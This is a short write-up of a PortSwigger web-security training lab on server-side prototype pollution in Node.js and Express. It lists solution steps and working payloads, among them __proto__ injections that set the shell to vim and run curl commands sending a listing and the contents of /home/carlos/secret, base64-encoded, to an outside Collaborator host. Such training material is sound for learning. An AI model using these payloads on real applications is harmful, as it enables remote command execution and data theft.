# Lab: Exfiltrating sensitive data via server-side prototype pollution

**Official lab URL:** https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution

## Lab idea

This advanced Node.js and Express challenge links unsafe server-side merging to a command-execution gadget and sensitive-data exposure. It practices evaluating the potential impact of a server-side pollution chain without documenting exploit steps.

## Vulnerability in brief
Prototype pollution is a JavaScript vulnerability class in which attacker-controlled input changes properties on an object prototype, most often the global `Object.prototype`. Other objects may then inherit those properties through JavaScript's prototype chain. A common cause is recursively merging an input object into an existing object without safely handling special property keys such as `__proto__` or constructor-related paths. Potential sources include URL query or fragment data, JSON input, and web messages.

## Solution idea
1. Log in and visit your account page.
2. In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.
3. Observe that when you submit the form, the data from the fields is sent to the server as JSON.
4. Send the request to Burp Repeater.
- …
6. In Burp Repeater, modify the payload in your malicious input parameter to a command that exfiltrates the contents of the file /home/carlos/secret to the public Burp Collaborator server.
7. Decode the contents of the body to reveal the secret.
8. In your browser, go to the lab banner and click Submit solution .

## Payloads / key values
- `POST /my-account/change-address`
- `__proto__`
- `json spaces`
- `"__proto__": { "json spaces":10 }`
- `child_process.execSync()`
- `"__proto__": { "shell":"vim", "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n" }`
- `input`
- `"input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"`
- `POST`
- `node_apps`
- `secret`
- `/home/carlos/secret`
- `"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"`

## Official source
- [PortSwigger Academy: Lab: Exfiltrating sensitive data via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution)
